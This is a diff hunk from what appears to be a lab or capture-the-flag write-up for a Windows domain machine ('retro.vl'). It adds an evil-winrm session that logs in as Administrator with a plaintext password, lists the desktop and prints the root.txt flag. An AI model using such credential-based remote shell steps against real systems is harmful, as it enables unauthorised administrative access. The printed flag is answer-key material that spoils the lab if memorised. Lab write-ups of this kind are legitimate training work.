@@ -408,6 +408,30 @@ File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save w
 Now we use the certificate and private key saved at administrator.pfx to retrieve the RC4 hash of the Administrator user:
 
 
+````
+└─$ evil-winrm -i retro.vl -u administrator -p NewPassword123!    
+                                        
+Evil-WinRM shell v4.1
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\desktop
+*Evil-WinRM* PS C:\Users\Administrator\desktop> dir
+
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          4/8/2025   8:11 PM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
+40fce9c3f09024bcab29d377ee1ed071
+*Evil-WinRM* PS C:\Users\Administrator\desktop>
+````
 
 
 
